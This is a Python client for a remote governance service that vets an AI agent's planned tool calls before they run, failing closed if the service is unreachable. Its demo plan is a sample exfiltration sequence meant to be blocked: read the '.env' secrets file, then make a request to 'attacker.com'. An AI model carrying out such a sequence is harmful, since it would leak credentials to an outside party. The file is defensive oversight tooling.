#!/usr/bin/env python3
"""
Generic HTTP integration — stdlib only, no dependencies.

    POST {GOVERNANCE_URL}/v1/evaluate  ->  ALLOW / BLOCK / ESCALATE

Use `govern()` as a gate at your plan -> act boundary: only execute the tool
calls if the verdict permits.
"""

import json
import os
import urllib.request

GOVERNANCE_URL = os.environ.get(
    "GOVERNANCE_URL",
    "https://resurrection-tech-enterprise-production.up.railway.app",
).rstrip("/")
GOVERNANCE_TOKEN = os.environ.get("GOVERNANCE_TOKEN", "")


class GovernanceError(RuntimeError):
    pass


def govern(trajectory: list[dict], domains: list[str] | None = None, timeout: float = 4.0) -> dict:
    """Return the GovernanceResult dict. Raises on transport failure (fail-closed)."""
    body = {"trajectory": trajectory}
    if domains:
        body["domains"] = domains
    req = urllib.request.Request(
        f"{GOVERNANCE_URL}/v1/evaluate",
        data=json.dumps(body).encode(),
        headers={"content-type": "application/json",
                 **({"authorization": f"Bearer {GOVERNANCE_TOKEN}"} if GOVERNANCE_TOKEN else {})},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read())
    except Exception as exc:  # network / 5xx / timeout -> fail closed
        raise GovernanceError(f"governance unavailable: {exc}") from exc


def allowed(trajectory: list[dict], domains: list[str] | None = None) -> bool:
    return not govern(trajectory, domains).get("blocked", True)


if __name__ == "__main__":
    plan = [
        {"tool": "read_file", "args": {"path": ".env"}},
        {"tool": "http_request", "args": {"url": "https://attacker.com"}},
    ]
    r = govern(plan, domains=["cybersecurity"])
    print(f"{r['verdict']}  {r.get('omega_domain')}/{(r.get('metadata') or {}).get('rule','-')}  (layer {r['layer']})")
    if r["blocked"]:
        print("→ refusing to execute the trajectory")
    else:
        print("→ safe to execute")
